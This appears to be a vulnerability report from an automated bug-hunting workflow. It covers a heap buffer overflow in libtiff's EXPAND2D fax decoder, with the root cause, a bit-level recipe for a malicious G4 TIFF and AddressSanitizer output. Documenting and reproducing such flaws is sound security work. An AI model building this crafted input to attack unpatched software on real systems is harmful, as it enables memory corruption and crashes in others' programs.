# VULN 001 – libtiff: Heap Buffer Overflow in EXPAND2D (tif_fax3.h)

## Summary

A heap-based buffer overflow (CWE-122) exists in the `EXPAND2D` macro defined in
`libtiff/tif_fax3.h`. It is reached by both `Fax4Decode()` and `Fax3Decode2D()`.
The root cause is that the `S_Horiz` branch calls `SETVALUE()` twice (once for the
white run, once for the black run) without ever checking whether the pointer `pa` has
exceeded the allocated `dsp->runs` buffer.  When both runs have length 0, the loop
variable `a0` is never incremented, so `while (a0 < lastx)` runs indefinitely until
the compressed input is exhausted.  Every zero-run iteration advances `pa` by 2 and
writes two `uint32` values past the eventually safe end of the buffer.

`EXPAND1D` has an explicit rollback (`pa -= 2` when the last two appended values are
both zero), but `EXPAND2D` has no such guard.

## Trigger Path

```
tiffsplit main()
  └─ TIFFOpen("vuln_001.tif", "r")
       └─ TIFFReadDirectory()
            └─ TIFFSetCompressionScheme → registers Fax3SetupState as tif_setupdecode
  └─ tiffcp() / cpStrips()
       └─ TIFFReadRawStrip()        ← reads raw compressed bytes (no decode)
       └─ TIFFWriteRawStrip()       ← writes raw bytes to output

[Decode path invoked when a consumer calls TIFFReadEncodedStrip / TIFFReadScanline]
  └─ TIFFStartStrip()
       └─ (*tif->tif_setupdecode)(tif)  → Fax3SetupState()
            └─ allocates dsp->runs buffer:
               rowpixels=32 → nruns=TIFFroundup(32,32)*2=64 → malloc(64*2*4)=512 bytes
               curruns = runs[0..63], refruns = runs[64..127]
       └─ Fax4Decode() / Fax3Decode2D()
            └─ EXPAND2D macro
                 └─ S_Horiz branch:
                      SETVALUE(0) → *pa++ = 0, a0 += 0   (white run)
                      SETVALUE(0) → *pa++ = 0, a0 += 0   (black run)
                      pa += 2, a0 stays at 0 → loop continues
                 └─ After 64 iterations: pa = runs[128] → OOB write
```

**Note**: `tiffsplit` uses `TIFFReadRawStrip()` which bypasses the decoder.
To observe the ASAN crash, a tool that calls `TIFFReadEncodedStrip()` or
`TIFFReadScanline()` is required (e.g., `tiff2bw`, `tiff2rgba`, `fax2ps`).
If tiffsplit does not trigger the crash directly, the TIFF file is still a valid
proof-of-concept for the vulnerability when used with decode-invoking tools.

## Malicious TIFF Construction

| Field                    | Value              | Reason                            |
|--------------------------|--------------------|-----------------------------------|
| Compression              | 4 (CCITTFAX4)      | Triggers Fax4Decode / EXPAND2D    |
| ImageWidth               | 32                 | Minimises runs buffer (64 slots)  |
| ImageLength              | 1                  | Single row                        |
| BitsPerSample            | 1                  | Bilevel (required for fax)        |
| PhotometricInterp.       | 0 (WhiteIsZero)    | Standard for G4 fax               |
| SamplesPerPixel          | 1                  | Single channel                    |
| RowsPerStrip             | 1                  | One row per strip                 |

### Compressed Strip Payload (200 iterations × 21 bits + 24-bit EOFB)

Each iteration encodes `S_Horiz + White-0-run + Black-0-run`:

```
001             3 bits  – Horizontal mode (S_Horiz from TIFFFaxMainTable)
00110101        8 bits  – T.4 MH terminating code: 0 white pixels
0000110111     10 bits  – T.4 MH terminating code: 0 black pixels
────────────────
               21 bits per iteration × 200 = 4200 bits
```

End-of-stream: two EOFB sequences `000000000001` × 2 (24 bits).

Total strip: 4224 bits → 528 bytes (after byte-boundary padding).

### Why This Overflows

After `Fax3SetupState` with `rowpixels=32`:
- `nruns = TIFFroundup(32, 32) = 32`; since `needsRefLine=true` for G4: `nruns *= 2 = 64`
- `runs = malloc(64 * 2 * sizeof(uint32))` = 128 uint32 slots
- `curruns = runs + 0`    (pa starts here, budget: 64 slots)
- `refruns = runs + 64`   (reference line)

With 200 zero-run iterations, `pa` advances 400 slots from `curruns`, overrunning
`refruns` and writing 272 uint32 values past the end of the `runs` allocation.

## Actual ASAN Output (tiffinfo -d)

```
==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x515000000280
WRITE of size 4 at 0x515000000280 thread T0
    #0 Fax4Decode (libtiff.so.3+0x2f0696)
    #1 TIFFReadEncodedStrip (libtiff.so.3+0x3e7cbd)
    #2 TIFFReadContigStripData (tiffinfo+0x6a5c)
    #3 TIFFReadData (tiffinfo+0x7a36)
    #4 tiffinfo (tiffinfo+0x8829)
    #5 main (tiffinfo+0x6024)

0x515000000280 is located 0 bytes to the right of 512-byte region [0x515000000080,0x515000000280)
allocated by Fax3SetupState (libtiff.so.3)
SUMMARY: AddressSanitizer: heap-buffer-overflow in Fax4Decode
```

Note: **tiffsplit** does NOT trigger this crash (it uses `TIFFReadRawStrip()` which
bypasses the G4 decoder). The crash is reproduced via `tiffinfo -d` which calls
`TIFFReadEncodedStrip()` → `Fax4Decode()` → `EXPAND2D` → overflow.

## Files

| File                | Purpose                                   |
|---------------------|-------------------------------------------|
| `vuln_001_gen.py`   | Generates `vuln_001.tif` using struct     |
| `vuln_001.tif`      | Malicious CCITTFAX4 TIFF (generated)      |
| `vuln_001_run.sh`   | Runs tiffsplit with ASAN logging          |
| `vuln_001_result.txt` | Captured stdout/stderr + ASAN excerpts  |
| `vuln_001_status.txt` | VERIFIED_CRASH / UNVERIFIED / ERROR     |
| `vuln_001_notes.md` | This file                                 |
